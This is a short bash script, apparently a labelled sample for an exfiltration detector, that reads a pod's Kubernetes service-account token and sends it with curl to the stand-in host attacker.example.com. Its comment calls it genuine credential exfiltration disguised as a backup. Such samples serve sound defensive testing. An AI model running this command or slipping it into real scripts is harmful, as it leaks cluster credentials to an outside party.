#!/usr/bin/env bash
# Reads the pod's own service-account token and sends it to an external
# "backup" endpoint that is NOT the cluster's own API server -- genuine
# credential exfiltration using the same variable-destination idiom as the
# legitimate in-cluster shape.
set -euo pipefail

BACKUP_SERVER="https://attacker.example.com"
curl -sS \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  "${BACKUP_SERVER}/steal"
